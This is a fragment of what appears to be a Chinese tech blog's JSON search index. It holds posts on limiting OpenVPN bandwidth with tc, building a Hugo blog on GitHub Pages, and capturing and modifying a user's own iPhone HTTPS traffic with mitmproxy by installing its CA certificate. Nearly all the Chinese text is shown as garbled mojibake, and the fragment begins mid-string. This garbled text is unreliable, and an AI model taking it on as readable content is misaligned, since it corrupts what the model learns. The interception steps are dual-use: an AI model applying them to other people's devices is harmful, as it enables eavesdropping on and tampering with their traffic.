ç”¨æˆ·ï¼Œè€Œæ˜¯é™åˆ¶æ•´ä½“ï¼Œæ‰€ä»¥ç®€å•ç”¨ TC å°±å¯ä»¥äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003etc qdisc del dev tun0 root  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etc qdisc add dev tun0 root handle 1: htb default \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eæˆ‘ä»¬ openvpn å¯çš„æ˜¯ tun0 ï¼Œæ‰€ä»¥é™åˆ¶çš„å¯¹è±¡å°±æ˜¯ dev tun0\u003c/li\u003e\n\u003cli\u003eé¦–å…ˆç¬¬ä¸€è¡Œæ¸…é™¤ tun0 çš„æ ¹é˜Ÿåˆ—\u003c/li\u003e\n\u003cli\u003eç„¶åç¬¬äºŒè¡Œå»ºç«‹ tun0 çš„ root æ ¹é˜Ÿåˆ—ä¸º 1:0 htb ï¼Œç¼ºçœæ˜¯1:1çš„å­é˜Ÿåˆ—\u003c/li\u003e\n\u003cli\u003eæœ€åä¸€è¡Œï¼Œç¬¬ä¸‰è¡Œå»ºç«‹ 1:1 çš„å­é˜Ÿåˆ—ï¼Œå¸¦å®½é™åˆ¶æ˜¯ 30Mbit ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¤§Bï¼Œå°±æ˜¯ç½‘ç»œæœ¯è¯­ä¸­çš„å¸¦å®½ï¼Œæ¢ç®—æˆå°bçš„è¯ï¼Œéœ€è¦é™¤ä»¥8\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæ•ˆæœå¾ˆæ˜æ˜¾ï¼Œç›´æ¥è¢«é™åˆ¶ä½ï¼ˆ41å…†è€Œä¸æ˜¯30Mæ˜¯å› ä¸ºè¿™å°æœºå™¨æ˜¯è™šæœºï¼Œå®ä½“æœºä¸Šè¿˜æœ‰åˆ«çš„æµé‡ï¼‰ï¼š\u003c/p\u003e","title":"OpenVPN é™åˆ¶æµé‡å¸¦å®½"},{"content":"æœ¬ç«™è¿™ä¸ªåšå®¢çš„ç”±æ¥ï¼š\næºè‡ªäº wiredcraft çš„é¢è¯•ï¼Œè¿™ä¸ªå…¬å¸è®©è€å…«å¾ˆæ˜¯å‘å¾€ï¼Œå¯ä»¥è¿œç¨‹å·¥ä½œï¼Œç¬¬ä¸€æ¬¡é¢è¯•æ˜¯ devops ï¼Œè€å¤–è§é¢èŠäº†åï¼Œç”±ä»£ç†ä¸­å›½äººé¢ã€‚å› ä¸ºé¢çš„æ˜¯K8Sçš„ä¸œè¥¿ï¼Œæ­£å¥½åˆšç»™ç”»åŒ…åŒ…å…¬å¸åšäº†æ•´ä½“è¿å¾€é˜¿é‡ŒACKçš„å·¥ç¨‹ï¼Œä»¥ä¸ºæ²¡é—®é¢˜ï¼Œå®é™…æ˜¯ç›´æ¥é—®å€’äº†æˆ‘ã€‚å°±å¥½æ¯”master nodeä¸Šé¢éƒ½è·‘äº†ä»€ä¹ˆè¿›ç¨‹ï¼Œå”‰ï¼Œä¸€è¨€éš¾å°½å•Šï¼Œåˆé—®åˆ°ansibleçš„å˜é‡ï¼Œå›ç­”ä¼°è®¡ä¹Ÿä¸æ»¡æ„ï¼Œç»“æœå°±æŒ‚äº†\nçŸ¥è€»è€Œåå‹‡ï¼Œåé¢å»æ¶è¡¥äº†ä¸€ä¸‹ansibleå’Œk8sçš„ä¸œè¥¿ï¼Œå®é™…ä¹Ÿæ˜¯å®é™…æ“ä½œå±…å¤šï¼Œç„¶åç¬¬äºŒæ¬¡é¢çš„æ˜¯ sysadminï¼Œå…¨ç¨‹è€å¤–é¢ã€‚è¿˜å‡ºäº†å‡ é“é¢˜ï¼Œåº”è¯¥æ˜¯æ²¡é—®é¢˜ã€‚ä½†æ˜¯å·¥èµ„è¦é«˜äº†ï¼Œä¹Ÿè¢«åˆ·äº†ã€‚\nè¿™ä¸ªåšå®¢å°±æ˜¯å…¶ä¸­ä¸€é“é¢˜ï¼Œé‚£æ—¢ç„¶æ­å»ºå‡ºæ¥äº†ï¼Œå¹²è„†å°±å¥½å¥½ç”¨å§ã€‚\næœ¬èº«è‡ªå·±å¯¹é™æ€çš„ Blog ç³»ç»Ÿä¹Ÿæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œè‡ªå·±ä¸»ç«™ www.rendoumi.com çš„ Blog æ˜¯ç”± journey æ­å»ºçš„ï¼Œæ˜¯ä¸€ä¸ªç²¾å·§çš„ go ç¨‹åºï¼Œæœ€å¦™çš„æ˜¯å®ƒå…¼å®¹ Ghost åšå®¢ç³»ç»Ÿï¼Œä¹Ÿèƒ½ä½¿ç”¨ Ghost çš„ theme ï¼Œè¿™æ ·å°±å®Œç¾çš„æŠŠè‡ªå·±ä»¥å‰ Ghost çš„åšå®¢è¿ç§»äº†è¿‡å»ï¼Œä½†æ˜¯ï¼Œé‡Œé¢æ–‡ç« æœ‰å¾ˆå¤šè¿‡æ—¶äº†ï¼Œä½†ä¹Ÿä¸æƒ³æ¸…ç†ï¼Œå¹²è„†å€Ÿç€è¿™ä¸ªæœºä¼šï¼Œä»æ–°å¼€å§‹ã€‚æ­ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ç³»ç»Ÿç»§ç»­å†™æ–°åšå®¢\næµè¡Œçš„ Markdown å†™ä½œå¹³å°æœ‰Hexoå’ŒHugoï¼Œé€‰Hugoæ˜¯å› ä¸ºå®åœ¨æ˜¯ä¸å–œæ¬¢nodeï¼Œå¼„ä¸€å †npmï¼Œè¿ç§»éº»çƒ¦æ­»ã€‚\nè¿™ä¸ªåšå®¢ç¨‹åºåŸºäºHugoï¼Œæ‰˜ç®¡åœ¨ githubï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œgithub æ˜¯æ‰˜ç®¡é™æ€æ–‡ä»¶çš„åœ°æ–¹ï¼ŒMarkdownçš„æœ€å¤§æ¯›ç—…æ˜¯å›¾ç‰‡ã€‚å›¾ç‰‡æ”¾åœ¨å›¾åºŠä¹Ÿä¸æ˜¯å¥½åŠæ³•ï¼Œæ‰€ä»¥å›¾ç‰‡å’Œé™æ€æ–‡ä»¶è¦åœ¨ä¸€èµ·ï¼Œä¸‹é¢å°±è¯´ä¸€ä¸‹æ­å»ºè¿‡ç¨‹ï¼Œæˆ‘çš„ä¸»æœºæ˜¯Ubuntuï¼š\nä¸€ã€ä¸‹è½½Hugo ä¸‹è½½åœ°å€ï¼š https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\nwget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz tar zxvf hugo_0.88.1_Linux-64bit.tar.gz äºŒã€åˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½• ./hugo new site MyBlog â€‹\nä¸‰ã€ä¸‹è½½theme cd MyBlog git clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo echo theme = \\\u0026#34;beautifulhugo\\\u0026#34; \u0026gt;\u0026gt; config.toml â€‹\nå››ã€å†™ä¸€ç¯‡æ–°æ–‡ç«  cd MyBlog ../hugo new posts/my-first-post.md echo \u0026#34;#### This is another Blog\u0026#34; \u0026gt;\u0026gt; content/posts/my-first-post.md äº”ã€è¿è¡Œserverï¼Œbuildè‰ç¨¿ cd MyBlog ../hugo server --buildDrafts â€‹\nå…­ã€æµ‹è¯•ä¸€ä¸‹ curl http://localhost:1313 â€‹\nä¸ƒã€æ¨é€åˆ°github é¦–å…ˆæˆ‘ä»¬è¦å»githubå¼€ä¸€ä¸ªxxx.github.ioçš„repoä»“åº“ï¼Œç„¶å git æŠŠç”Ÿæˆçš„é™æ€å†…å®¹æ¨ä¸Šå»å°±å¥½äº†\ncd MyBlog #ç”Ÿæˆé™æ€æ–‡ä»¶ ../hugo --buildDrafts #æ–‡ä»¶ç”Ÿæˆçš„ç›®å½•æ˜¯public cd public #æ­£å¸¸gitæ“ä½œå°±å¯ä»¥äº† git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin git@github.com:zhangrr/zhangrr.github.io.git git push -u origin main å…«ã€çœ‹ä¸‹ç»“æœ æ‰“å¼€ç½‘é¡µ http://zhangrr.github.io å°±èƒ½çœ‹åˆ°ç½‘é¡µäº†\nâ€‹\nä¹ã€é€‰æ‹©å†™ä½œè½¯ä»¶ å…¶å®ç°åœ¨å¼€å§‹æ‰æ˜¯æœ€é‡è¦çš„ï¼Œç”¨ä»€ä¹ˆè½¯ä»¶æ¥å†™ï¼Œå°±ç”¨å¤§å®¶æ¨èçš„ Typora æ¥å°±å¥½äº†\n# or use # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add - # add Typora\u0026#39;s repository sudo add-apt-repository \u0026#39;deb https://typora.io/linux ./\u0026#39; sudo apt-get update # install typora sudo apt-get install typora åã€é€‰æ‹©ç›®å½•å­˜æ”¾æ ¼å¼ è¿™ä¸ªæ‰æ˜¯æœ€ä¸»è¦çš„é—®é¢˜ï¼Œçœ‹ä¸‹å›¾ï¼Œpostç›®å½•æ˜¯æ‰€æœ‰æ–‡ç« ï¼Œä¸‹é¢æŒ‰ç›®å½•å­˜æ”¾ï¼Œç›®å½•åæ˜¯æ—¥æœŸå’Œæ–‡ç« åï¼Œç›®å½•é‡Œé¢æ˜¯index.mdå’Œæ–‡ç« é™„å¸¦çš„å›¾ç‰‡ã€‚\næˆ‘è§‰å¾—è¿™ä¸ªæ¨¡å¼æ‰æ˜¯ç¬¦åˆæˆ‘çš„è¦æ±‚çš„ã€‚\n. â”œâ”€â”€ post â”‚ â”œâ”€â”€ 2018-01-11-å…³è”äº†ä¸¤æ¬¾å°ç¨‹åº.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-02-05-ä¸€æ¬¾å°å°çš„ç‰©æµæ•°æ®äº§å“.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-03-19-ç°å·²åŠ å…¥ Algolia æœç´¢æœåŠ¡.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-04-13-æˆ‘æ˜¯å¦‚ä½•æç ¸äº†æœ¬ç«™æœç´¢æœåŠ¡çš„.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-04-18-å°ç«™æ„å»ºå·¥å…·å·²æˆåŠŸåˆ‡æ¢åˆ° Hugo.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-04-19-å¼€å§‹ç¿»è¯‘ä¸€ä¸ªæ–‡æ¡£ï¼šSaleor.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-04-22-Saleor åˆç¨¿å·²ç¿»è¯‘å®Œæˆ.md â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-04-26-ä»Šå¤©å…¨æ˜¯å¹²è´§ â”‚ â”‚ â”œâ”€â”€ IMG_5991-4755089.jpg â”‚ â”‚ â”œâ”€â”€ IMG_5997-4755064.jpg â”‚ â”‚ â”œâ”€â”€ IMG_5998-4755103.jpg â”‚ â”‚ â”œâ”€â”€ IMG_5999-4755051.jpg â”‚ â”‚ â”œâ”€â”€ IMG_6001-4755073.jpg â”‚ â”‚ â”œâ”€â”€ IMG_6002-4755080.jpg â”‚ â”‚ â”œâ”€â”€ IMG_6003-4755030.jpg â”‚ â”‚ â”œâ”€â”€ IMG_6004-4755009.jpg â”‚ â”‚ â””â”€â”€ index.md â”‚ â”œâ”€â”€ 2018-05-02-ä» Jekyll åˆ° Hugo çš„ä¸€äº›ç»†èŠ‚.md â”‚ â””â”€â”€ index.md â”‚ â””â”€â”€ 2018-05-03-Hugo çš„æ–‡ä»¶ç®¡ç†æ–¹æ¡ˆ.md â”‚ â””â”€â”€ index.md åä¸€ã€å¾®è°ƒ Typora ä¸ºäº†èƒ½æ˜¾ç¤ºç›®å½•ç»“æ„Outlineï¼Œæ‰€ä»¥æ‰€æœ‰å‰¯æ ‡é¢˜éœ€è¦ç”¨ ctrl+2 çš„æ ‡é¢˜æ–‡æœ¬ï¼Œè¿™æ ·å°±èƒ½è‡ªåŠ¨ç”ŸæˆOutline\nä¸ºäº†èƒ½è®©å‰ªè´´æ¿è‡ªåŠ¨æŠŠctrl+vè´´ä¸Šçš„å›¾ç‰‡æ”¾åˆ°ç›®å½•é‡Œé¢ï¼Œéœ€è¦è®¾ç½®Image\nè¿™æ ·å°±å®Œç¾äº†ï¼Œä»¥åå°±åœ¨è¿™é‡Œå†™å·¥ä½œåšå®¢äº†ã€‚\nåäºŒã€æ›´æ–°ï¼Œ Typora çš„é™çº§ æœ€æ–°æ¶ˆæ¯ï¼ŒTypora å‡åˆ°äº† 1.0 ï¼Œå¼€å§‹æ”¶è´¹äº†ã€‚\nå…è´¹çš„æœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯ typora 0.11.18 ç‰ˆæœ¬ï¼Œè¿˜å¥½èƒ½ä¸‹åˆ°ï¼š\nä¸‹è½½åœ°å€ï¼šhttps://download.typora.io/linux/typora_0.11.18_amd64.deb\nå›é€€æ–¹æ³•ï¼š\nsudo apt autoremove typora sudo dpkg -i typora_0.11.18_amd64.deb sudo add-apt-repository --remove \u0026#39;deb https://typora.io/linux ./\u0026#39; ","permalink":"https://rendoumi.com/posts/20211015-hugo_blog/","summary":"\u003cp\u003eæœ¬ç«™è¿™ä¸ªåšå®¢çš„ç”±æ¥ï¼š\u003c/p\u003e\n\u003cp\u003eæºè‡ªäº wiredcraft çš„é¢è¯•ï¼Œè¿™ä¸ªå…¬å¸è®©è€å…«å¾ˆæ˜¯å‘å¾€ï¼Œå¯ä»¥è¿œç¨‹å·¥ä½œï¼Œç¬¬ä¸€æ¬¡é¢è¯•æ˜¯ devops ï¼Œè€å¤–è§é¢èŠäº†åï¼Œç”±ä»£ç†ä¸­å›½äººé¢ã€‚å› ä¸ºé¢çš„æ˜¯K8Sçš„ä¸œè¥¿ï¼Œæ­£å¥½åˆšç»™ç”»åŒ…åŒ…å…¬å¸åšäº†æ•´ä½“è¿å¾€é˜¿é‡ŒACKçš„å·¥ç¨‹ï¼Œä»¥ä¸ºæ²¡é—®é¢˜ï¼Œå®é™…æ˜¯ç›´æ¥é—®å€’äº†æˆ‘ã€‚å°±å¥½æ¯”master nodeä¸Šé¢éƒ½è·‘äº†ä»€ä¹ˆè¿›ç¨‹ï¼Œå”‰ï¼Œä¸€è¨€éš¾å°½å•Šï¼Œåˆé—®åˆ°ansibleçš„å˜é‡ï¼Œå›ç­”ä¼°è®¡ä¹Ÿä¸æ»¡æ„ï¼Œç»“æœå°±æŒ‚äº†\u003c/p\u003e\n\u003cp\u003eçŸ¥è€»è€Œåå‹‡ï¼Œåé¢å»æ¶è¡¥äº†ä¸€ä¸‹ansibleå’Œk8sçš„ä¸œè¥¿ï¼Œå®é™…ä¹Ÿæ˜¯å®é™…æ“ä½œå±…å¤šï¼Œç„¶åç¬¬äºŒæ¬¡é¢çš„æ˜¯ sysadminï¼Œå…¨ç¨‹è€å¤–é¢ã€‚è¿˜å‡ºäº†å‡ é“é¢˜ï¼Œåº”è¯¥æ˜¯æ²¡é—®é¢˜ã€‚ä½†æ˜¯å·¥èµ„è¦é«˜äº†ï¼Œä¹Ÿè¢«åˆ·äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªåšå®¢å°±æ˜¯å…¶ä¸­ä¸€é“é¢˜ï¼Œé‚£æ—¢ç„¶æ­å»ºå‡ºæ¥äº†ï¼Œå¹²è„†å°±å¥½å¥½ç”¨å§ã€‚\u003c/p\u003e\n\u003cp\u003eæœ¬èº«è‡ªå·±å¯¹é™æ€çš„ Blog ç³»ç»Ÿä¹Ÿæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œè‡ªå·±ä¸»ç«™ \u003ca href=\"https://www.rendoumi.com\"\u003ewww.rendoumi.com\u003c/a\u003e çš„ Blog æ˜¯ç”± journey æ­å»ºçš„ï¼Œæ˜¯ä¸€ä¸ªç²¾å·§çš„ go ç¨‹åºï¼Œæœ€å¦™çš„æ˜¯å®ƒå…¼å®¹ Ghost åšå®¢ç³»ç»Ÿï¼Œä¹Ÿèƒ½ä½¿ç”¨ Ghost çš„ theme ï¼Œè¿™æ ·å°±å®Œç¾çš„æŠŠè‡ªå·±ä»¥å‰ Ghost çš„åšå®¢è¿ç§»äº†è¿‡å»ï¼Œä½†æ˜¯ï¼Œé‡Œé¢æ–‡ç« æœ‰å¾ˆå¤šè¿‡æ—¶äº†ï¼Œä½†ä¹Ÿä¸æƒ³æ¸…ç†ï¼Œå¹²è„†å€Ÿç€è¿™ä¸ªæœºä¼šï¼Œä»æ–°å¼€å§‹ã€‚æ­ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ç³»ç»Ÿç»§ç»­å†™æ–°åšå®¢\u003c/p\u003e\n\u003cp\u003eæµè¡Œçš„ Markdown å†™ä½œå¹³å°æœ‰Hexoå’ŒHugoï¼Œé€‰Hugoæ˜¯å› ä¸ºå®åœ¨æ˜¯ä¸å–œæ¬¢nodeï¼Œå¼„ä¸€å †npmï¼Œè¿ç§»éº»çƒ¦æ­»ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªåšå®¢ç¨‹åºåŸºäºHugoï¼Œæ‰˜ç®¡åœ¨ githubï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œgithub æ˜¯æ‰˜ç®¡é™æ€æ–‡ä»¶çš„åœ°æ–¹ï¼ŒMarkdownçš„æœ€å¤§æ¯›ç—…æ˜¯å›¾ç‰‡ã€‚å›¾ç‰‡æ”¾åœ¨å›¾åºŠä¹Ÿä¸æ˜¯å¥½åŠæ³•ï¼Œæ‰€ä»¥å›¾ç‰‡å’Œé™æ€æ–‡ä»¶è¦åœ¨ä¸€èµ·ï¼Œä¸‹é¢å°±è¯´ä¸€ä¸‹æ­å»ºè¿‡ç¨‹ï¼Œæˆ‘çš„ä¸»æœºæ˜¯Ubuntuï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½hugo\"\u003eä¸€ã€ä¸‹è½½Hugo\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½åœ°å€ï¼š \u003ca href=\"https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\"\u003ehttps://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf hugo_0.88.1_Linux-64bit.tar.gz          \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒåˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½•\"\u003eäºŒã€åˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½•\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./hugo new site MyBlog   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ€‹\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ä¸‹è½½theme\"\u003eä¸‰ã€ä¸‹è½½theme\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e MyBlog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo                                                   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003etheme\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003ebeautifulhugo\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; config.toml   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ€‹\u003c/p\u003e\n\u003ch2 id=\"å››å†™ä¸€ç¯‡æ–°æ–‡ç« \"\u003eå››ã€å†™ä¸€ç¯‡æ–°æ–‡ç« \u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd MyBlog\n../hugo new posts/my-first-post.md                                                                                               echo \u0026#34;#### This is another Blog\u0026#34; \u0026gt;\u0026gt; content/posts/my-first-post.md  \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"äº”è¿è¡Œserverbuildè‰ç¨¿\"\u003eäº”ã€è¿è¡Œserverï¼Œbuildè‰ç¨¿\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e MyBlog                                                                                                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e../hugo server --buildDrafts   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ€‹\u003c/p\u003e","title":"æœ¬ç«™åšå®¢çš„ç”±æ¥ä»¥åŠæ­å»ºä½¿ç”¨æ•™ç¨‹"},{"content":"ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å®æ–½äº†Ubuntuä¸‹wifiçƒ­ç‚¹çš„æ­å»ºï¼Œé‚£ä¹ˆï¼Œå…¶å®æˆ‘æ˜¯æƒ³æŠ“æˆ‘iphoneæ‰‹æœºçš„httpsæ˜æ–‡æµé‡åŒ…æ¥ç€ã€‚\næ€ä¹ˆæŠ“å–å‘¢ï¼Ÿ\næ–¹æ³•ä¹Ÿå¾ˆç®€å•\nä¸€ã€å®‰è£… mitmproxy æœ‰wifiçƒ­ç‚¹é‚£å°æœºå™¨çš„wlanç½‘å¡åœ°å€æ˜¯192.168.222.1ï¼Œå°±åœ¨é‚£å°ä¸Šå®‰è£…ï¼Œä¾¿äºæŠ“å–\npip install mitmproxy äºŒã€è¿è¡Œmitmproxy mitmproxy -p 8080 ä¸‰ã€é…ç½®iphoneå®‰è£…mitmè¯ä¹¦ æ‰“å¼€æ‰‹æœºï¼Œè·å–wifiçƒ­ç‚¹ï¼Œè®¾ç½®è¿™ä¸ªwifiä½¿ç”¨æ‰‹æœºä»£ç†ï¼Œ192.168.222.1:8080\nç„¶åç”¨Safariæµè§ˆå™¨æ‰“å¼€ç½‘å€ï¼šhttp://mitm.it\næ‰¾åˆ°IOSé‚£è¡Œï¼Œä»”ç»†çœ‹ä¸€çœ‹è¯´æ˜\nç‚¹å‡» Get mitmproxy-ca-cert.pem å®‰è£…æè¿°æ–‡ä»¶\nå®‰è£…å®Œä»¥åï¼Œåœ¨è®¾ç½® \u0026ndash;\u0026gt; å·²ä¸‹è½½æè¿°æ–‡ä»¶ï¼Œå®‰è£…æè¿°æ–‡ä»¶\nå®‰è£…å¥½ä»¥åä¼šæ˜¾ç¤ºç»¿è‰²çš„å·²éªŒè¯\nç„¶ååœ¨æ‰‹æœºä¸Šç”¨ safari è®¿é—®ç½‘å€ï¼šhttps://ip138.com\nå›åˆ° Ubuntu çš„å‘½ä»¤è¡Œçª—å£ï¼Œä¸Šä¸‹é€‰ä¸­æŠ“åˆ°çš„åŒ…ï¼Œç„¶åæŒ‰å›è½¦æŸ¥çœ‹ï¼Œå·¦å³å…‰æ ‡é”®ç§»åŠ¨ï¼Œå¯ä»¥çœ‹åˆ°responseæ˜¯æ˜æ–‡çš„ï¼Œqé”®æ˜¯è¿”å›ä¸Šä¸€çº§\nå››ã€åŒ…çš„æ‹¦æˆªä¿®æ”¹ ä¸Šé¢æ¼”ç¤ºçš„æ˜¯å¸¸è§„çš„æŸ¥çœ‹æ“ä½œï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹ mitmproxy çš„å¦ä¸€å¼ºå¤§åŠŸèƒ½ï¼Œæ‹¦æˆªä¿®æ”¹ request å’Œ responseã€‚\nè¾“å…¥ iï¼Œç„¶åè¾“å…¥ ~s å†æŒ‰å›è½¦é”®ï¼Œè¿™æ—¶å€™å°±è¿›å…¥äº† response æ‹¦æˆªæ¨¡å¼ã€‚å¦‚æœè¾“å…¥ ~q åˆ™è¿›å…¥ request çš„æ‹¦æˆªæ¨¡å¼ï¼Œæ›´å¤šçš„å‘½ä»¤å¯ä»¥è¾“å…¥ ï¼Ÿ æŸ¥çœ‹ã€‚æ‹¦æˆªæ¨¡å¼ä¸‹çš„é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå…¶ä¸­çº¢è‰²çš„è¡¨ç¤ºè¯·æ±‚æ­£è¢«æ‹¦æˆªï¼Œè¿™æ—¶ Enter è¿›å…¥å å†æŒ‰ e å°±å¯ä»¥ä¿®æ”¹ request æˆ–è€… responseã€‚ä¿®æ”¹æ—¶æ˜¯ç”¨ vim è¿›è¡Œç¼–è¾‘çš„ï¼Œä¿®æ”¹å®ŒæˆåæŒ‰ a å°†è¯·æ±‚æ”¾è¡Œï¼Œå¦‚æœè¦æ”¾è¡Œæ‰€æœ‰è¯·æ±‚è¾“å…¥ A å³å¯ã€‚\n","permalink":"https://rendoumi.com/posts/20211014-iphone_hijack/","summary":"\u003cp\u003eä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å®æ–½äº†Ubuntuä¸‹wifiçƒ­ç‚¹çš„æ­å»ºï¼Œé‚£ä¹ˆï¼Œå…¶å®æˆ‘æ˜¯æƒ³æŠ“æˆ‘iphoneæ‰‹æœºçš„httpsæ˜æ–‡æµé‡åŒ…æ¥ç€ã€‚\u003c/p\u003e\n\u003cp\u003eæ€ä¹ˆæŠ“å–å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•ä¹Ÿå¾ˆç®€å•\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…-mitmproxy\"\u003eä¸€ã€å®‰è£… mitmproxy\u003c/h2\u003e\n\u003cp\u003eæœ‰wifiçƒ­ç‚¹é‚£å°æœºå™¨çš„wlanç½‘å¡åœ°å€æ˜¯192.168.222.1ï¼Œå°±åœ¨é‚£å°ä¸Šå®‰è£…ï¼Œä¾¿äºæŠ“å–\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install mitmproxy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒè¿è¡Œmitmproxy\"\u003eäºŒã€è¿è¡Œmitmproxy\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emitmproxy -p \u003cspan class=\"m\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 